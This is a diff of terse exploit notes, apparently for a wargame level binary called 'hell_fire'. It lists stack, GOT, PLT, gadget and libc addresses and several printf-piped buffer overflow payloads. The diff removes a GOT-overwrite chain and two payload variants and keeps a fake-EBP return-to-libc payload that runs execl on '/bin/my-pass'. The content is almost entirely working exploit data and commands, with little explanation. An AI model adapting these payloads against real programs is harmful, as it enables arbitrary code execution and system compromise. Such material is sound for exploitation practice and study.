@@ -8,17 +8,12 @@
 	+268
 </fgets buffer address>
 
-<got address>
-	0x8049754
-	\x54\x97\x04\x08
-</got address>
-
 <leave, ret address>
 	0x8049561
 	\x61\x85\x04\x08
 	0x8049562
 	\x62\x85\x04\x08
-</leave, ret address>:
+</leave, ret address>
 
 <execl address>
 	0x7a5720
@@ -43,59 +38,6 @@
 	0x71c000-0x83d000
 </executable pmap>
 
-<with got overwrite>
-	<stack struct>
-		ret|~~~
-		strcpy plt address|printf plt address|strcpy arg1|arg2|execl arg1|arg2
-	</stack struct>
-
-	<strcpy plt address>
-		0x80483cc
-		\xcc\x83\x04\x08
-	</strcpy plt address>
-
-	<printf plt address>
-		0x80483ac
-		\xac\x83\x04\x08
-	</printf plt address>
-
-	<printf got address>
-		(strcpy arg1)
-		0x804976c
-		\x6c\x97\x04\x08
-	</printf got address>
-
-	<pointer to address of execl + 1>
-		(strcpy arg2)
-		fgets buffer address + 292: 0xf6ffe124
-		\x24\xe1\xff\xf6
-	</pointer to address of execl + 1>
-	
-	<execl + 1 address>
-		0x7a5721
-		\x21\x57\x7a\x00
-	</execl + 1 address>
-
-	<pointer to "/bin/my-pass">
-		(execl arg1, arg2)
-		fgets buffer address + 296: 0xf6ffe128
-		\x28\xe1\xff\xf6
-	</pointer to "/bin/my-pass">
-
-	<fgets buffer address>
-		0xf6ffe000
-		\x00\xe0\xff\xf6
-	</fgets buffer address>
-
-	<do_system address>
-		0x750320
-		\x20\x03\x75\x00
-	</do_system address>
-	<command>
-		printf "$(for x in `seq 1 268`; do printf "\x90"; done)$(printf "\xcc\x83\x04\x08")$(printf "\xac\x83\x04\x08")$(printf "\x6c\x97\x04\x08")$(printf "\x24\xe1\xff\xf6")$(printf "\x28\xe1\xff\xf6")$(printf "\x28\xe1\xff\xf6")$(printf "\x21\x57\x7a\x00")$(printf "/bin/my-pass\x00")"| ./hell_fire
-	</command>
-</with got overwirte>
-
 <with fake ebp>
 	<fgets buffer>
 		0xf6ffe000
@@ -116,12 +58,8 @@
 	<command>
 		printf "$(for x in `seq 1 268`; do printf "A"; done)$(printf "\x61\x85\x04\x08")$(for x in `seq 1 88`; do printf "a"; done)$(printf "\x6c\xe1\xff\xf6")$(printf "\x61\x85\x04\x08")$(printf "\x90\x54\x7a\x00")$(printf "bbbb")$(printf "\x8c\xe1\xff\xf6")$(printf "\x84\xe1\xff\xf6")$(printf "\x00\x00\x00\x00")$(printf "\x8c\xe1\xff\xf6")$(printf "\x00\x00\x00\x00")$(printf "/bin/my-pass\x00")"| ./hell_fire
 	</command>
-
-	<command2>
-		printf "$(for x in `seq 1 268`; do printf "A"; done)$(printf "\x61\x85\x04\x08")$(for x in `seq 1 88`; do printf "a"; done)$(printf "\x70\xe1\xff\xf6")$(printf "\x61\x85\x04\x08")$(printf "aaaa")$(printf "\xc1\x07\x75\x00")$(printf "bbbbbbbb")$(printf "\x80\xe1\xff\xf6")$(printf "/bin/my-pass\x00")"| ./hell_fire
-	</command2>
-
-	<command3>
-		printf "$(for x in `seq 1 268`; do printf "A"; done)$(printf "\x61\x85\x04\x08")$(for x in `seq 1 88`; do printf "a"; done)$(printf "\x70\xe1\xff\xf6")$(printf "\x61\x85\x04\x08")$(printf "aaaa")$(printf "\x20\x03\x75\x00")$(printf "bbbb")$(printf "\x7c\xe1\xff\xf6")$(printf "/bin/my-pass\x00")"| ./hell_fire
-	</command3>
 </with fake ebp>
+
+<search.c>
+	
+</search.c>
